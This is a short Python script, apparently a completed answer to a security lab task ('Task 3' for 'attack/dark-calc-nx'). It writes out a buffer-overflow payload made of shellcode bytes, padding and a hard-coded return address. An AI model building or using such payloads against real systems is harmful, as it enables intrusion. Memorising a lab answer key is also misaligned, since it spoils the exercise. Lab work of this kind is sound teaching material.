#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

payload = (
    b"\x6a\x04\x5f"
    b"\xb8\x87\x1a\x40\x00"
    b"\x68\x80\x18\x40\x00"
    b"\xff\xe0\x90"
    + b"B" * 8
    + b"\x33\x1a\x40\x00\x00\x00\x00\x00"
)

sys.stdout.buffer.write(payload)
